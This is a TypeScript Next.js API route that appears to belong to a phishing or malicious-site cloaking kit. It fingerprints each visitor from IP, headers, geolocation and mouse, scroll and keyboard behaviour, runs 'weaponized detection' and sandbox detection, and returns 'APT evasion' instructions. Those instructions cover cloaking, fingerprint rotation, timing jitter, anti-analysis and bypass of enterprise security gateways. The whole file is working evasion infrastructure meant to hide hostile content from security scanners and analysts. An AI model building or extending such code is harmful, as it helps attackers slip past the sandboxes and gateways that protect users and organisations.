/**
 * APT Instructions API
 * 
 * Returns lightweight instructions for frontend
 * All heavy APT logic runs here on backend
 * Frontend only receives delay/behavior instructions
 * 
 * POST /api/apt/instructions
 */

import { NextRequest, NextResponse } from 'next/server'
import { weaponizedDetection, type WeaponizedDetectionContext } from '@/lib/stealth/weaponizedDetection'
import { generateAPTInstructions } from '@/lib/stealth/aptInstructions'
import { loadSettings } from '@/lib/adminSettings'
import { getGeoData } from '@/lib/geoLocation'
import { detectSandbox } from '@/lib/sandboxDetection'

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const {
      fingerprint,
      behaviorData,
      microHumanSignals,
      timingData,
      requestCount = 1,
    } = body

    // Get request metadata
    const ip = request.headers.get('cf-connecting-ip') || 
               request.headers.get('x-forwarded-for')?.split(',')[0] || 
               request.headers.get('x-real-ip') || 
               'unknown'

    const userAgent = request.headers.get('user-agent') || 'Unknown'

    // Extract headers
    const headers: Record<string, string> = {}
    request.headers.forEach((value, key) => {
      headers[key] = value
    })

    // Get settings and geo
    const settings = await loadSettings()
    const geoData = await getGeoData(ip)
    const securitySettings = settings.security as any
    const threatModel = securitySettings?.threatModel || 'enterprise'
    const enableAPTEvasion = securitySettings?.enableAPTEvasion !== false

    // ============================================
    // BACKEND: Full APT Evasion Execution
    // ============================================
    const detectionContext: WeaponizedDetectionContext = {
      ip,
      userAgent,
      fingerprint,
      requestTimestamp: Date.now(),
      responseTime: timingData?.responseTime,
      cpuJitter: timingData?.cpuJitter,
      timingVariance: timingData?.variance,
      mouseMovements: behaviorData?.mouseMovements,
      scrollEvents: behaviorData?.scrollEvents,
      keyboardPresses: behaviorData?.keyboardPresses,
      timeSpent: behaviorData?.timeSpent,
      naturalInteractions: behaviorData?.naturalInteractions,
      microHumanSignals: microHumanSignals,
      referer: headers['referer'] || headers['referer'],
      headers,
      geoLocation: geoData.country || geoData.city || undefined,
      requestCount,
      enableAPTEvasion,
      threatModel,
    }

    // Execute full weaponized detection (includes APT evasion)
    const weaponizedResult = await weaponizedDetection(detectionContext)

    // Detect sandbox for severity calculation
    let sandboxSeverity = 0
    try {
      const requestObj = new Request('https://example.com', {
        headers: headers as HeadersInit,
      })
      const sandboxResult = await detectSandbox(requestObj)
      sandboxSeverity = sandboxResult.isSandbox ? sandboxResult.confidence / 100 : 0
    } catch {
      // Ignore sandbox detection errors
    }

    // ============================================
    // Generate Lightweight Instructions
    // ============================================
    const instructions = generateAPTInstructions(
      {
        evasionScore: weaponizedResult.aptEvasion?.evasionScore || 0,
        detectionRisk: weaponizedResult.aptEvasion?.detectionRisk || 100,
        cloakingActive: weaponizedResult.aptEvasion?.cloakingActive || false,
        cloakingTechniques: weaponizedResult.aptEvasion?.cloakingTechniques || [],
        fingerprintRotated: weaponizedResult.aptEvasion?.fingerprintRotated || false,
        jitterApplied: weaponizedResult.aptEvasion?.jitterApplied || false,
        jitterDelay: weaponizedResult.aptEvasion?.jitterDelay || 0,
      },
      weaponizedResult.threatScore,
      weaponizedResult.isThreat,
      sandboxSeverity,
      threatModel
    )

    return NextResponse.json({
      ok: true,
      instructions,
      // Optional: Include minimal metadata for debugging
      metadata: {
        threatScore: weaponizedResult.threatScore,
        isThreat: weaponizedResult.isThreat,
        confidence: weaponizedResult.confidence,
      },
    })
  } catch (error) {
    // Fail open: return minimal instructions (no delay)
    return NextResponse.json({
      ok: false,
      instructions: {
        delay: 0,
        delayReason: 'error-fallback',
        rotationRequired: false,
        behaviorProfile: 'natural',
        sandboxSeverity: 0,
        cloakingActive: false,
        cloakingLevel: 'low',
        enterpriseBypassActive: false,
        bypassedGateways: [],
        threatScore: 0,
        isThreat: false,
        instructions: {
          applyMicroDelay: false,
          showLoadingScreen: false,
          enableAntiAnalysis: false,
          enableBehaviorTracking: true,
        },
      },
    })
  }
}

